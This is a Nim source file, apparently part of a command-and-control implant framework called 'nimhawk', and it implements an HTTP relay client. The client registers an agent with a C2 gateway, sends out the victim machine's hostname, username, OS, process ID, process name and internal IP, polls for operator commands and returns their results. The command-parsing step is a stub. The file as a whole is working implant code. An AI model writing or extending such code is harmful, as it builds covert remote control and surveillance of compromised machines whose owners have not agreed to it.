# HTTP Relay Client - Replace TCP sockets with HTTP requests
import json, puppy, strutils
from ../../util/sysinfo import getSysHostname, getUsername, getOSInfo, getCurrentPID, getCurrentProcessName, getLocalIP

# HTTP Relay Client configuration
type
  HttpRelayConfig* = object
    gatewayHost*: string
    gatewayPort*: int
    relayClientId*: string        # Temporary relay connection ID
    cumulusAgentId*: string       # Real C2-assigned agent ID
    isConnected*: bool
    isRegistered*: bool           # Whether registered with C2

var g_httpRelayConfig*: HttpRelayConfig

# Initialize HTTP relay client
proc initHttpRelayClient*(host: string, port: int, agentId: string): bool =
  try:
    g_httpRelayConfig.gatewayHost = host
    g_httpRelayConfig.gatewayPort = port
    g_httpRelayConfig.relayClientId = agentId
    g_httpRelayConfig.cumulusAgentId = ""
    g_httpRelayConfig.isConnected = false
    g_httpRelayConfig.isRegistered = false
    
    when defined debug:
      echo "[HTTP_RELAY] 🔗 Initialized HTTP relay client"
      echo "[HTTP_RELAY] 🔗 Gateway: " & host & ":" & $port
      echo "[HTTP_RELAY] 🔗 Agent ID: " & agentId
    
    return true
    
  except Exception as e:
    when defined debug:
      echo "[HTTP_RELAY] ❌ Failed to initialize: " & e.msg
    return false

# Test connection to Gateway
proc testGatewayConnection*(): bool =
  try:
    when defined debug:
      echo "[HTTP_RELAY] 🔍 DEBUG: gatewayHost = '" & g_httpRelayConfig.gatewayHost & "'"
      echo "[HTTP_RELAY] 🔍 DEBUG: gatewayPort = " & $g_httpRelayConfig.gatewayPort
      echo "[HTTP_RELAY] 🔍 DEBUG: relayClientId = '" & g_httpRelayConfig.relayClientId & "'"
      echo "[HTTP_RELAY] 🔍 DEBUG: isConnected = " & $g_httpRelayConfig.isConnected
      
    let url = "http://" & g_httpRelayConfig.gatewayHost & ":" & $g_httpRelayConfig.gatewayPort & "/alive"
    
    when defined debug:
      echo "[HTTP_RELAY] 🔍 Testing connection to: " & url
    
    # Use puppy for HTTP GET request (consistent with the rest of the project)
    let response = get(url, timeout = 10)  # 10 second timeout
    
    when defined debug:
      echo "[HTTP_RELAY] 🔍 DETAILED Response analysis:"
      echo "[HTTP_RELAY] 🔍   Raw code: " & $response.code
      echo "[HTTP_RELAY] 🔍   Raw body: '" & response.body & "'"
      echo "[HTTP_RELAY] 🔍   Body length: " & $response.body.len
      echo "[HTTP_RELAY] 🔍   Body hex: " & response.body.toHex
      echo "[HTTP_RELAY] 🔍   Code == 200: " & $(response.code == 200)
      echo "[HTTP_RELAY] 🔍   Body == 'OK': " & $(response.body == "OK")
      echo "[HTTP_RELAY] 🔍   Body stripped == 'OK': " & $(response.body.strip() == "OK")
    
    # Try both exact match and stripped match
    let bodyMatches = response.body == "OK" or response.body.strip() == "OK"
    if response.code == 200 and bodyMatches:
      g_httpRelayConfig.isConnected = true
      when defined debug:
        echo "[HTTP_RELAY] ✅ Gateway connection successful"
      return true
    else:
      g_httpRelayConfig.isConnected = false
      when defined debug:
        echo "[HTTP_RELAY] ❌ Gateway responded with: " & $response.code & " body: '" & response.body & "'"
      return false
      
  except Exception as e:
    g_httpRelayConfig.isConnected = false
    when defined debug:
      echo "[HTTP_RELAY] ❌ Connection test failed: " & e.msg
    return false

# Register with C2 via Gateway
proc registerCumulusAgentViaGateway*(): bool =
  try:
    when defined debug:
      echo "[HTTP_RELAY] 🔐 Registering with C2 via Gateway"
    
    # Send GATEWAY_REGISTER_REQUEST to Gateway with REAL system info
    let registrationPayload = %*{
      "command": "GATEWAY_REGISTER_REQUEST",
      "relay_client_id": g_httpRelayConfig.relayClientId,
      "system_info": %*{
        "hostname": getSysHostname(),
        "username": getUsername(), 
        "os": getOSInfo(),
        "pid": getCurrentPID(),
        "process": getCurrentProcessName(),
        "internal_ip": getLocalIP()
      }
    }
    
    let url = "http://" & g_httpRelayConfig.gatewayHost & ":" & $g_httpRelayConfig.gatewayPort & "/proxy"
    
    when defined debug:
      echo "[HTTP_RELAY] 🔐 Sending registration to: " & url
      echo "[HTTP_RELAY] 🔐 Payload: " & $registrationPayload
    
    let response = post(url, headers = @[
      ("Content-Type", "application/json"),
      ("User-Agent", "nimhawk-cumulus-agent")
    ], body = $registrationPayload, timeout = 30)
    
    when defined debug:
      echo "[HTTP_RELAY] 🔐 Registration response: " & $response.code
      echo "[HTTP_RELAY] 🔐 Registration body: " & response.body
    
    if response.code == 200:
      # Parse C2 response for assigned ID
      try:
        let responseData = parseJson(response.body)
        if responseData.hasKey("id"):
          g_httpRelayConfig.cumulusAgentId = responseData["id"].getStr()
          g_httpRelayConfig.isRegistered = true
          
          when defined debug:
            echo "[HTTP_RELAY] ✅ Registration successful!"
            echo "[HTTP_RELAY] ✅ Assigned ID: " & g_httpRelayConfig.cumulusAgentId
          
          return true
      except:
        when defined debug:
          echo "[HTTP_RELAY] ❌ Failed to parse registration response"
        return false
    
    return false
    
  except Exception as e:
    when defined debug:
      echo "[HTTP_RELAY] ❌ Registration failed: " & e.msg
    return false

# Poll Gateway for commands via HTTP
proc pollGatewayForCommands*(): (string, string, seq[string]) =
  if not g_httpRelayConfig.isConnected or not g_httpRelayConfig.isRegistered:
    return ("", "", @[])
  
  try:
    when defined debug:
      echo "[HTTP_RELAY] 📡 Polling Gateway for commands"
    
    # Create communication_array for this relay client using REAL agent ID
    let commArray = %*{
      "communication_array": [
        {
          "agent_id": g_httpRelayConfig.cumulusAgentId,  # Use real C2-assigned ID
          "ip": g_httpRelayConfig.gatewayHost & ":" & $g_httpRelayConfig.gatewayPort,
          "encrypted_message": "COMMAND_REQUEST"
        }
      ]
    }
    
    let url = "http://" & g_httpRelayConfig.gatewayHost & ":" & $g_httpRelayConfig.gatewayPort & "/proxy"
    
    when defined debug:
      echo "[HTTP_RELAY] 📡 Sending request to: " & url
      echo "[HTTP_RELAY] 📡 Payload: " & $commArray
    
    # Use puppy for HTTP POST request (consistent with the rest of the project)
    let response = post(url, headers = @[
      ("Content-Type", "application/json")
    ], body = $commArray, timeout = 10)
    
    when defined debug:
      echo "[HTTP_RELAY] 📡 Response status: " & $response.code
      echo "[HTTP_RELAY] 📡 Response body: " & response.body
    
    if response.code == 200:
      # Parse response for commands
      # For now, simulate successful communication
      return ("", "", @[])
    else:
      when defined debug:
        echo "[HTTP_RELAY] ❌ Gateway error: " & $response.code
      return ("", "", @[])
      
  except Exception as e:
    when defined debug:
      echo "[HTTP_RELAY] ❌ Polling error: " & e.msg
    return ("", "", @[])

# Send command result to Gateway via HTTP
proc sendResultToGateway*(cmdGuid: string, cmdResult: string): bool =
  if not g_httpRelayConfig.isConnected or not g_httpRelayConfig.isRegistered:
    return false
  
  try:
    when defined debug:
      echo "[HTTP_RELAY] 📤 Sending result to Gateway"
      echo "[HTTP_RELAY] 📤 GUID: " & cmdGuid
      echo "[HTTP_RELAY] 📤 Result length: " & $cmdResult.len
    
    # Create communication_array with result using REAL agent ID
    let commArray = %*{
      "communication_array": [
        {
          "agent_id": g_httpRelayConfig.cumulusAgentId,  # Use real C2-assigned ID
          "ip": g_httpRelayConfig.gatewayHost & ":" & $g_httpRelayConfig.gatewayPort,
          "encrypted_message": cmdResult
        }
      ]
    }
    
    let url = "http://" & g_httpRelayConfig.gatewayHost & ":" & $g_httpRelayConfig.gatewayPort & "/proxy"
    
    let response = post(url, headers = @[
      ("Content-Type", "application/json")
    ], body = $commArray, timeout = 10)
    
    when defined debug:
      echo "[HTTP_RELAY] 📤 Result sent, response: " & $response.code
    
    return response.code == 200
    
  except Exception as e:
    when defined debug:
      echo "[HTTP_RELAY] ❌ Failed to send result: " & e.msg
    return false

# Check if HTTP relay client is connected
proc isHttpRelayConnected*(): bool =
  return g_httpRelayConfig.isConnected

# Get HTTP relay client info
proc getHttpRelayInfo*(): string =
  if g_httpRelayConfig.isConnected:
    return "Connected to " & g_httpRelayConfig.gatewayHost & ":" & $g_httpRelayConfig.gatewayPort
  else:
    return "Not connected"
